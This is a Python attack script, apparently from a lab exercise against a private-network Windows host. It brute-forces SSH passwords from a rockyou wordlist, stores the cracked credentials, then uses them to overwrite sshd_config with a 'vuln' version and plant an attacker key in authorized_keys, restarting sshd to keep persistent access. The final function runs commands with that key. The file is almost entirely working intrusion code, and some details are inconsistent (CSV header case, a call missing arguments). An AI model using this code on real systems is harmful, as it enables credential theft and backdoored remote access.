import csv
import paramiko
import sys
from scp import SCPClient

def ssh_brute_force(hostname, port, username, password_file):
    """
    Attempts to brute force an SSH connection given a hostname, port, username, and password list file.

    Args:
        hostname (str): The hostname or IP address of the SSH server.
        port (int): The port number of the SSH server.
        username (str): The username to use for the SSH connection.
        password_file (str): The path to the password list file.

    Returns:
        bool: True if the SSH connection was successful, False otherwise.
    """

    # Create an SSH client using the Paramiko library
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Read from the password list file and save it to a list
    passwordList = []
    with open(password_file, "r") as f:
        for line in f.readlines():
            passwordList.append(line.strip())

    # Attempt to connect to the SSH server using the username and password list
    for password in passwordList:
        try:
            ssh.connect(hostname, port=port, username=username, password=password)
            # If the connection was successful, print the valid credentials
            print(f"[*] Found valid credentials - Username: {username}, Password: {password}")

            # Write the valid credentials to credentials.csv
            # If the file does not exist, create it and write the header
            try:
                with open("resources\\credentials.csv", "x") as f:
                    f.write("username,password")
            except FileExistsError:
                pass

            with open("resources\\credentials.csv", "a") as f:
                f.write(f"\n{username},{password}")
                print("[*] Wrote valid credentials to credentials.csv")
            
            # Close the SSH connection
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Invalid credentials - Username: {username}, Password: {password}")
        except paramiko.SSHException as e:
            print(f"[-] Unable to establish SSH connection: {e}")
            sys.exit(1)
        except paramiko.ssh_exception.NoValidConnectionsError as e:
            print(f"[-] Unable to connect to the SSH server: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error: {e}")
            sys.exit(1)
    
    print("[!] Exhausted password list. Unable to find valid credentials.")
    ssh.close()
    return False


def setup_ssh_config_and_key(hostname, port, credentials_path="resources\\credentials.csv", sshd_config_path="resources\\vuln_sshd_config", access_key_path="resources\\accessKey.pub"):
    """
    Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
    After running, you will then be able to use the access key to SSH into the target machine.

    Args:
        hostname (str): The hostname or IP address of the target Windows machine.
        port (int): The port number of the SSH server.
        credentials_path (str): The path to the credentials file.
        sshd_config_path (str): The path to the sshd_config file.
        access_key_path (str): The path to the access key file.

    Returns:
        bool: True if the SSH connection was successful, False otherwise.
    """

    # Import a CSV file with credentials
    with open(credentials_path, "r") as csv_file:
        # Read the first line of the CSV
            csv_reader = csv.DictReader(csv_file)
            for credRow in csv_reader:
                break  # Read only the first data row

    # Define username and password
    username = credRow["Username"]
    password = credRow["Password"]

    # Create SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the target Windows machine
        ssh.connect(hostname, port=port, username=username, password=password)

        # Create SCP client
        scp = SCPClient(ssh.get_transport())

        # Copy sshd_config to the target machine using SCP
        scp.put(sshd_config_path, remote_path='C:/ProgramData/ssh/sshd_config')

        # Copy the access key to the target machine using SCP
        scp.put(access_key_path, remote_path=f'C:/Users/{username}/.ssh/authorized_keys')

        # Close the SCP and SSH clients
        scp.close()

        # Set access rule protection and permissions on authorized_keys file using pwsh.exe
        acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{username}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'

        ssh.exec_command(acl_cmd)

        # Restart the SSH service (sshd) using pwsh.exe
        ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')

        # Close the SSH connection
        ssh.close()
        
        print("Successfully inserted sshd_config and authorized_keys.")
        return True
    
    except paramiko.AuthenticationException:
        print("Failed to authenticate to the target machine.")
    except paramiko.SSHException as e:
        print(f"An SSH error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

    ssh.close()
    return False

# Do not need to merge this with revampedAttackScript, already done
def ssh_run_command_privKey(command, host, username, password=None, private_key_path=None):
    """
    Runs a SINGLE command through ssh remotely and grab the output.

    Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file

    Either a password OR a private key MUST be provided. If both are provided, the private key will be used.

    Args:
        command (str): The command to run on the remote server.
        host (str): The hostname or IP address of the remote server.
        username (str): The username to use for the SSH connection.
        password (str): The password to use for the SSH connection.
        private_key_path (str): The path to the private key file.

    Returns:
        None
    """

    ssh_output: str = "" # Declare as string to prevent error proning

    # Create an SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the remote server
        if private_key_path is not None:
            # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
            private_key = paramiko.Ed25519Key.from_private_key_file(private_key_path)
            ssh.connect(host, username=username, pkey=private_key)
        elif password is not None:
            ssh.connect(host, username=username, password=password)
        else:
            # Handle case when neither password nor private key is provided
            print("Please provide either a password or a private key.")
            return

        # Placeholder for other code to run after successful connection
        print("Connected to the remote server.")
        # Run the command
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
        ssh_output_list = ssh_stdout.readlines()
        for line_no, line in enumerate(ssh_output_list):
            ssh_output_list[line_no] = line.replace("\r\n", "\n")
        ssh_output = "".join(ssh_output_list)

        return ssh_output

    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as e:
        print(f"An SSH error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

    ssh.close()

if __name__ == "__main__":
    hostname = "172.16.2.77"
    port = 22
    username = "Student"
    password_file = "resources\\rockyou.txt"

    #ssh_brute_force(hostname, port, username, password_file)

    credentials_path = "resources\\credentials.csv"
    sshd_config_path = "resources\\vuln_sshd_config"
    access_key_path = "resources\\accessKey.pub"

    setup_ssh_config_and_key(hostname, port, credentials_path, sshd_config_path, access_key_path)

    private_key_path = "resources\\accessKey"

    #ssh_run_command_privKey(hostname, username, private_key_path)
